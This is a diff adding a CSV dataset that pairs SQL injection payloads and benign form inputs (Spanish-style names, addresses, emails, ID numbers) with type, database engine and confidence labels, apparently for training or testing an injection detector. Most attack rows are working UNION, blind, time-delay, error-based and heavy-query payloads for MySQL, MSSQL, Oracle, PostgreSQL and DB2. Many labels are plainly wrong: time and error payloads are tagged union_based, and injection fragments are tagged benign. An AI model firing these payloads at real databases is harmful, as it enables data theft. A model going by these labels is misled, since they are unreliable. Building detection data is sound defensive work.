@@ -1,0 +1,201 @@
+id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
+26005,"1', ( case when 2872 = 2872 then 1 else null end )",benign,generic,0.9,Signals: 'case'. Payload length: 50 chars.,2
+26025,-8045 ) ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 24 chars.,2
+26027,"1%"" order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 16 chars.,2
+26039,"1',iif ( 6625 = 6625,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 28 chars.,2
+26062,-9456%' ) ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 25 chars.,2
+26101,castil de vela,benign,generic,0.9,Signals: 'cast'. Payload length: 14 chars.,2
+26001,"-6363"" ) where 4043 = 4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
+26003,"-2898"" where 3301 = 3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#",union_based,generic,0.7,UNION-based payload detected. Payload length: 92 chars.,2
+26010,"1 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
+26017,"-1504"" ) as wpes where 6256 = 6256 union all select 6256,6256,6256,6256,6256,6256,6256,6256,6256,6256#",union_based,generic,0.7,UNION-based payload detected. Payload length: 102 chars.,2
+26020,1 ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 27 chars.,2
+26023,"-4954%"" ) or 5244 = 4832",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
+26030,"1"" union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
+26031,"1 ) ) as queb where 2449 = 2449 union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
+26035,"-9150%' ) ) ) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
+26042,1%' ) and 8734 = 5844,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
+26049,-5089' ) ) as icbb where 1129 = 1129 or 6250 = 9650,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
+26054,1 ) where 2918 = 2918 and 7533 = 7533--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
+26055,"-8609%"" ) ) ) union all select 6021,6021,6021,6021,6021,6021--",union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
+26037,"1"" ) ) )",benign,generic,0.5,. Payload length: 8 chars.,2
+26064,ejerci78,benign,generic,0.5,. Payload length: 8 chars.,2
+26065,"calle valencia de don juan 161, 7?d",benign,generic,0.5,. Payload length: 35 chars.,2
+26066,b3r3al,benign,generic,0.5,. Payload length: 6 chars.,2
+26068,elder@parcalia.hn,benign,generic,0.5,. Payload length: 17 chars.,2
+26070,compte,benign,generic,0.5,. Payload length: 6 chars.,2
+26071,leshowit,benign,generic,0.5,. Payload length: 8 chars.,2
+26072,lehar,benign,generic,0.5,. Payload length: 5 chars.,2
+26074,"calle profesor angel lacalle, s/n,",benign,generic,0.5,. Payload length: 34 chars.,2
+26075,tardn,benign,generic,0.5,. Payload length: 5 chars.,2
+26076,3.54937E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26077,rigby,benign,generic,0.5,. Payload length: 5 chars.,2
+26078,caada del hoyo,benign,generic,0.5,. Payload length: 14 chars.,2
+26079,englert,benign,generic,0.5,. Payload length: 7 chars.,2
+26080,threader,benign,generic,0.5,. Payload length: 8 chars.,2
+26081,elias pallares,benign,generic,0.5,. Payload length: 14 chars.,2
+26082,f1581il2ente,benign,generic,0.5,. Payload length: 12 chars.,2
+26084,bocana$da,benign,generic,0.5,. Payload length: 9 chars.,2
+26085,escarpelo,benign,generic,0.5,. Payload length: 9 chars.,2
+26086,3.4008E+15,benign,generic,0.5,. Payload length: 10 chars.,2
+26087,"calle limones, 60,",benign,generic,0.5,. Payload length: 18 chars.,2
+26088,dillard,benign,generic,0.5,. Payload length: 7 chars.,2
+26089,casas de miravete,benign,generic,0.5,. Payload length: 17 chars.,2
+26090,olea de boedo,benign,generic,0.5,. Payload length: 13 chars.,2
+26091,empuar,benign,generic,0.5,. Payload length: 6 chars.,2
+26092,0o380ado6,benign,generic,0.5,. Payload length: 9 chars.,2
+26093,montroy,benign,generic,0.5,. Payload length: 7 chars.,2
+26095,8.36404E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26096,"grupo fuensanta 197, 12?a",benign,generic,0.5,. Payload length: 25 chars.,2
+26097,jalance,benign,generic,0.5,. Payload length: 7 chars.,2
+26098,4.20136E+14,benign,generic,0.5,. Payload length: 11 chars.,2
+26099,"c/ ricardo gutierrez 26, 8-d",benign,generic,0.5,. Payload length: 28 chars.,2
+26100,ivancevi,benign,generic,0.5,. Payload length: 8 chars.,2
+26102,genaro,benign,generic,0.5,. Payload length: 6 chars.,2
+26103,ergasto,benign,generic,0.5,. Payload length: 7 chars.,2
+26104,"llosa de ranes, la",benign,generic,0.5,. Payload length: 18 chars.,2
+26105,es2eri5o,benign,generic,0.5,. Payload length: 8 chars.,2
+26106,cuenca,benign,generic,0.5,. Payload length: 6 chars.,2
+26109,5.71439E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26110,marcano giner,benign,generic,0.5,. Payload length: 13 chars.,2
+26111,lemoine5@informatica2009.zr,benign,generic,0.5,. Payload length: 27 chars.,2
+26112,pr3caz,benign,generic,0.5,. Payload length: 6 chars.,2
+26113,marsh@comerciosaspe.ke,benign,generic,0.5,. Payload length: 22 chars.,2
+26114,inescourt7@citycvs.mil,benign,generic,0.5,. Payload length: 22 chars.,2
+26115,"c/ julia minguillon, 179, 7-a",benign,generic,0.5,. Payload length: 29 chars.,2
+26116,obsequ.iosa,benign,generic,0.5,. Payload length: 11 chars.,2
+26117,"calle carlos amel, 32, 12?h",benign,generic,0.5,. Payload length: 27 chars.,2
+26118,kallewar,benign,generic,0.5,. Payload length: 8 chars.,2
+26120,toperzer1,benign,generic,0.5,. Payload length: 9 chars.,2
+26121,canaan,benign,generic,0.5,. Payload length: 6 chars.,2
+26122,suzuki,benign,generic,0.5,. Payload length: 6 chars.,2
+26123,"antigua de ancora s/n,",benign,generic,0.5,. Payload length: 22 chars.,2
+26124,"calle dean miranda 106, 6-f",benign,generic,0.5,. Payload length: 27 chars.,2
+26125,madgett,benign,generic,0.5,. Payload length: 7 chars.,2
+26126,gerola pugliesi,benign,generic,0.5,. Payload length: 15 chars.,2
+26127,"c/ comedias, 109,",benign,generic,0.5,. Payload length: 17 chars.,2
+26128,8.61689E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26129,tanchak,benign,generic,0.5,. Payload length: 7 chars.,2
+26130,"don quijote 81,",benign,generic,0.5,. Payload length: 15 chars.,2
+26131,ceferina,benign,generic,0.5,. Payload length: 8 chars.,2
+26132,saturnino,benign,generic,0.5,. Payload length: 9 chars.,2
+26133,israel_piggot@joyclub.pe,benign,generic,0.5,. Payload length: 24 chars.,2
+26134,5n37do,benign,generic,0.5,. Payload length: 6 chars.,2
+26135,lanfranchi@getgold.tl,benign,generic,0.5,. Payload length: 21 chars.,2
+26136,micaas,benign,generic,0.5,. Payload length: 6 chars.,2
+26137,herrmann@codwatw.edu,benign,generic,0.5,. Payload length: 20 chars.,2
+26138,9.48E+15,benign,generic,0.5,. Payload length: 8 chars.,2
+26139,5.83899E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26140,irissou,benign,generic,0.5,. Payload length: 7 chars.,2
+26141,quisto,benign,generic,0.5,. Payload length: 6 chars.,2
+26142,s5bal850de,benign,generic,0.5,. Payload length: 10 chars.,2
+26143,balsam-prey@mmo.com.cat,benign,generic,0.5,. Payload length: 23 chars.,2
+26144,lurlene,benign,generic,0.5,. Payload length: 7 chars.,2
+26145,"c/ elvas 112, 13-a",benign,generic,0.5,. Payload length: 18 chars.,2
+26146,"de canoves 13,",benign,generic,0.5,. Payload length: 14 chars.,2
+26147,hembrick,benign,generic,0.5,. Payload length: 8 chars.,2
+26148,1.76488E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26149,darcy@google-movil.dz,benign,generic,0.5,. Payload length: 21 chars.,2
+26150,katia,benign,generic,0.5,. Payload length: 5 chars.,2
+26151,lenya@fbi-criminal-network.com.mil,benign,generic,0.5,. Payload length: 34 chars.,2
+26152,3.81894E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26153,penarroya ingla,benign,generic,0.5,. Payload length: 15 chars.,2
+26154,6.65741E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26155,"calle artigako haritza, s/n 8?d",benign,generic,0.5,. Payload length: 31 chars.,2
+26156,kiyohara,benign,generic,0.5,. Payload length: 8 chars.,2
+26157,iracema,benign,generic,0.5,. Payload length: 7 chars.,2
+26158,recabdador,benign,generic,0.5,. Payload length: 10 chars.,2
+26159,bernadet,benign,generic,0.5,. Payload length: 8 chars.,2
+26161,nehemiah,benign,generic,0.5,. Payload length: 8 chars.,2
+26162,reiji,benign,generic,0.5,. Payload length: 5 chars.,2
+26163,"plaa gabriela mistral, 140",benign,generic,0.5,. Payload length: 26 chars.,2
+26164,mirabel,benign,generic,0.5,. Payload length: 7 chars.,2
+26165,sanidad,benign,generic,0.5,. Payload length: 7 chars.,2
+26166,arriharn espinet,benign,generic,0.5,. Payload length: 16 chars.,2
+26167,alguer murillo,benign,generic,0.5,. Payload length: 14 chars.,2
+26168,swearing,benign,generic,0.5,. Payload length: 8 chars.,2
+26169,lightfie,benign,generic,0.5,. Payload length: 8 chars.,2
+26170,epnimo,benign,generic,0.5,. Payload length: 6 chars.,2
+26171,guillen,benign,generic,0.5,. Payload length: 7 chars.,2
+26172,mahbeer,benign,generic,0.5,. Payload length: 7 chars.,2
+26173,zohar@pablobracamonte.bh,benign,generic,0.5,. Payload length: 24 chars.,2
+26174,azarshah,benign,generic,0.5,. Payload length: 8 chars.,2
+26175,m7124v3,benign,generic,0.5,. Payload length: 7 chars.,2
+26176,medianero,benign,generic,0.5,. Payload length: 9 chars.,2
+26177,euzaine@schnapps.com.gs,benign,generic,0.5,. Payload length: 23 chars.,2
+26178,amelia,benign,generic,0.5,. Payload length: 6 chars.,2
+26179,estival,benign,generic,0.5,. Payload length: 7 chars.,2
+26180,3.98E+15,benign,generic,0.5,. Payload length: 8 chars.,2
+26181,"calle manco, 109, 10-g",benign,generic,0.5,. Payload length: 22 chars.,2
+26182,vinko,benign,generic,0.5,. Payload length: 5 chars.,2
+26183,parke antonio trueba 175,benign,generic,0.5,. Payload length: 24 chars.,2
+26184,8.5138E+15,benign,generic,0.5,. Payload length: 10 chars.,2
+26185,9.84215E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26186,"calle la revoltosa, 55, 11c",benign,generic,0.5,. Payload length: 27 chars.,2
+26187,"calle hostieros, 24",benign,generic,0.5,. Payload length: 19 chars.,2
+26188,condensativo,benign,generic,0.5,. Payload length: 12 chars.,2
+26189,5.88977E+15,benign,generic,0.5,. Payload length: 11 chars.,2
+26190,poma gozalbo,benign,generic,0.5,. Payload length: 12 chars.,2
+26192,contreras,benign,generic,0.5,. Payload length: 9 chars.,2
+26193,ma724-3ra,benign,generic,0.5,. Payload length: 9 chars.,2
+26194,olaya,benign,generic,0.5,. Payload length: 5 chars.,2
+26195,9.84is22nte334c799,benign,generic,0.5,. Payload length: 18 chars.,2
+26196,rub de bracamonte,benign,generic,0.5,. Payload length: 17 chars.,2
+26198,muthuswa,benign,generic,0.5,. Payload length: 8 chars.,2
+26199,d76en3r9n8z01,benign,generic,0.5,. Payload length: 13 chars.,2
+26015,1 ) ) ) rlike sleep ( 5 ) #,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
+26043,1 rlike sleep ( 5 ),time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
+26048,"1' where 9116 = 9116 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
+26050,"-5703' ) or elt ( 2972 = 8708,8708 )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,1
+26053,1' ) ) ) and sleep ( 5 ) and ( ( ( 'vbck' like 'vbck,time_blind,mysql,0.9,Signals: 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql,1
+26004,1 where 9932 = 9932,benign,generic,0.5,. Payload length: 19 chars.,1
+26009,1' ) as chla where 6098 = 6098,benign,generic,0.5,. Payload length: 30 chars.,1
+26018,1 ) where 9683 = 9683,benign,generic,0.5,. Payload length: 21 chars.,1
+26033,1' ) where 8167 = 8167,benign,generic,0.5,. Payload length: 22 chars.,1
+26041,"1"" ) ) as hace where 8785 = 8785",benign,generic,0.5,. Payload length: 32 chars.,1
+26052,"1"" ) where 8153 = 8153",benign,generic,0.5,. Payload length: 22 chars.,1
+26063,99745017c,benign,generic,0.5,. Payload length: 9 chars.,1
+26067,46942381w,benign,generic,0.5,. Payload length: 9 chars.,1
+26069,24596413y,benign,generic,0.5,. Payload length: 9 chars.,1
+26073,45699398p,benign,generic,0.5,. Payload length: 9 chars.,1
+26083,57317186j,benign,generic,0.5,. Payload length: 9 chars.,1
+26094,99997973e,benign,generic,0.5,. Payload length: 9 chars.,1
+26107,02054707w,benign,generic,0.5,. Payload length: 9 chars.,1
+26108,21184515c,benign,generic,0.5,. Payload length: 9 chars.,1
+26119,59760678p,benign,generic,0.5,. Payload length: 9 chars.,1
+26160,76150645z,benign,generic,0.5,. Payload length: 9 chars.,1
+26191,40592671v,benign,generic,0.5,. Payload length: 9 chars.,1
+26197,75771832b,benign,generic,0.5,. Payload length: 9 chars.,1
+26000,-7710' where 5658 = 5658 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
+26002,"1' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'nlnk' like 'nlnk",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
+26006,-4215 ) where 5782 = 5782 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,union_based,mssql,1.0,"Signals: 'char', 'case'; UNION-based payload detected; DB: mssql",0
+26007,1' where 1045 = 1045 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,union_based,postgresql,1.0,"Signals: 'pg_sleep', 'sleep'; UNION-based payload detected; DB: postgresql",0
+26008,"1"" where 7344 = 7344 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
+26012,"-2033"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",union_based,generic,1.0,"Signals: 'concat', 'case'; UNION-based payload detected",0
+26014,"1'|| ( select 'fpfl' from dual where 1434 = 1434 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ||'",union_based,oracle,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected; DB: oracle",0
+26021,"1' ) and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,1.0,"Signals: 'elt', 'sleep'; Time-blind SQLi (sleep/delay function); DB: mysql",0
+26024,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""fkmh"" = ""fkmh",union_based,mysql,1.0,"Signals: 'sleep', 'rlike'; UNION-based payload detected; DB: mysql",0
+26026,"1' ) where 4786 = 4786 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'if'; UNION-based payload detected; DB: mysql",0
+26029,1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,union_based,generic,1.0,"Signals: 'chr', 'cast', 'case'; UNION-based payload detected",0
+26032,"1' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( 'javh' = 'javh",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
+26034,"1' ) ) as hmyc where 6732 = 6732 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",union_based,mysql,1.0,"Signals: 'elt', 'concat', 'exp'; UNION-based payload detected; DB: mysql",0
+26036,"1"" ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( ""asvy"" = ""asvy",union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
+26038,"-6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # ikqw",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
+26044,"1"" ) as jmwr where 5978 = 5978 rlike ( select ( case when ( 1396 = 8762 ) then 1 else 0x28 end ) ) --",union_based,mysql,1.0,"Signals: 'rlike', 'case'; UNION-based payload detected; DB: mysql",0
+26045,"-9133"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""crfy"" = ""crfy",union_based,oracle,1.0,"Signals: 'chr', 'case', 'dual'; UNION-based payload detected; DB: oracle",0
+26051,"-6851' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'csfx' = 'csfx",union_based,mssql,1.0,"Signals: 'convert', 'char', 'case'; UNION-based payload detected; DB: mssql",0
+26059,"1 ) ) as rwsn where 9946 = 9946 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",union_based,mysql,1.0,"Signals: 'extractvalue', 'elt', 'concat'; UNION-based payload detected; DB: mysql",0
+26061,"1%' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( '%' = '",union_based,generic,1.0,"Signals: 'substring', 'substr', 'char'; UNION-based payload detected",0
+26011,1%' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( '%' = ',union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+26019,1%' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+26028,1'|| ( select 'qtep' where 2572 = 2572 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+26056,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'fegp' = 'fegp",union_based,mysql,0.9,Signals: 'benchmark'; UNION-based payload detected; DB: mysql,0
+26057,"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""%"" = """,union_based,mysql,0.9,Signals: 'sleep'; UNION-based payload detected; DB: mysql,0
+26013,"1%"" ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 168 chars.,0
+26016,"( select count ( * ) from generate_series ( 1,5000000 ) )",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 57 chars.,0
+26022,"1 where 6040 = 6040 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",union_based,generic,0.7,UNION-based payload detected. Payload length: 126 chars.,0
+26040,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( 'jloi' = 'jloi",union_based,postgresql,0.7,UNION-based payload detected; DB: postgresql. Payload length: 76 chars.,0
+26046,1'+ ( select ntym where 4750 = 4750,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,0
+26047,"1"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""jgoq"" = ""jgoq",union_based,db2,0.7,UNION-based payload detected; DB: db2. Payload length: 141 chars.,0
+26058,"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""fpqh"" = ""fpqh",union_based,generic,0.7,UNION-based payload detected. Payload length: 126 chars.,0
+26060,"1'+ ( select wjpc where 5943 = 5943 and make_set ( 8403 = 8403,8899 ) ) +'",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,0
